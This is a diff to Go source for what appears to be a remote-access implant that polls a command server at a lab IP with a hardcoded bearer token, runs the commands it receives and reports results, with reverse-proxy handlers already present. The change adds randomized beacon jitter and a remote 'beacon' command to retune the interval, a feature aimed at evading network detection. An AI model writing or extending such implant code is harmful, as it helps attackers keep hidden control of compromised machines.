@@ -15,6 +15,7 @@ import (
     "image/png"
     "io/ioutil"
     "log"
+     mrand "math/rand"
     "net"
     "net/http"
     "net/url"
@@ -44,6 +45,12 @@ var (
     serverURL        = "http://192.168.56.101:5000"
     bearerToken      = "Azerty112345678"
 )
+
+var (
+    beaconMin = 10
+    beaconMax = 30
+)
+
 
 type Command struct {
     ID  string `json:"id"`
@@ -92,31 +99,39 @@ func main() {
         })
 
 */
-    ticker := time.NewTicker(10 * time.Second)
+go func() {
+    mrand.Seed(time.Now().UnixNano())
+    for {
+        // use the latest values of beaconMin/beaconMax
+        interval := mrand.Intn(beaconMax-beaconMin+1) + beaconMin
+        time.Sleep(time.Duration(interval) * time.Second)
 
-    go func() {
-        for range ticker.C {
-            mu.Lock()
-            if !isCommandRunning {
-                isCommandRunning = true
-                mu.Unlock()
+        mu.Lock()
+        if !isCommandRunning {
+            isCommandRunning = true
+            mu.Unlock()
 
-                cmd, err := fetchCommand(agentID)
-                if err != nil {
-                    log.Printf("Error fetching command: %v", err)
-                    continue
-                }
-                if cmd.ID != "" {
-                    executeCommandAndSendResult(cmd)
-                }
-
+            cmd, err := fetchCommand(agentID)
+            if err != nil {
+                log.Printf("Error fetching command: %v", err)
                 mu.Lock()
                 isCommandRunning = false
-        }
+                mu.Unlock()
+                continue
+            }
+            if cmd.ID != "" {
+                executeCommandAndSendResult(cmd)
+            }
+
+            mu.Lock()
+            isCommandRunning = false
+            mu.Unlock()
+        } else {
             mu.Unlock()
         }
-    }()
-
+    }
+}()
+ 
     select {} // Prevent the application from exiting immediately.
 }
 
@@ -272,6 +287,8 @@ func executeCommandAndSendResult(cmd Command) {
     case cmd.Cmd == "reverse_proxy_stop":
          stopReverseProxy()
          sendResult(CommandResult{ID: cmd.ID, Result: "[+] Reverse proxy stop signal sent."})
+    case strings.HasPrefix(cmd.Cmd, "beacon "):
+         updateBeaconInterval(cmd)
     default:
         executeOtherCommand(cmd)
     }
@@ -1000,3 +1017,32 @@ func sanitizeHost(s string) string {
     }
     return b.String()
 }
+
+func updateBeaconInterval(cmd Command) {
+    args := strings.TrimPrefix(cmd.Cmd, "beacon ")
+    parts := strings.Fields(args)
+    var newMin, newMax int
+    for _, p := range parts {
+        if strings.HasPrefix(p, "min=") {
+            fmt.Sscanf(p, "min=%d", &newMin)
+        } else if strings.HasPrefix(p, "max=") {
+            fmt.Sscanf(p, "max=%d", &newMax)
+        }
+    }
+
+    if newMin <= 0 || newMax <= 0 || newMin >= newMax {
+        sendResult(CommandResult{
+            ID:     cmd.ID,
+            Result: "❌ Invalid beacon range. Use: beacon min=10 max=30 (min < max)",
+        })
+        return
+    }
+
+    beaconMin = newMin
+    beaconMax = newMax
+    sendResult(CommandResult{
+        ID:     cmd.ID,
+        Result: fmt.Sprintf("✅ Beacon interval updated: min=%d, max=%d", beaconMin, beaconMax),
+    })
+}
+
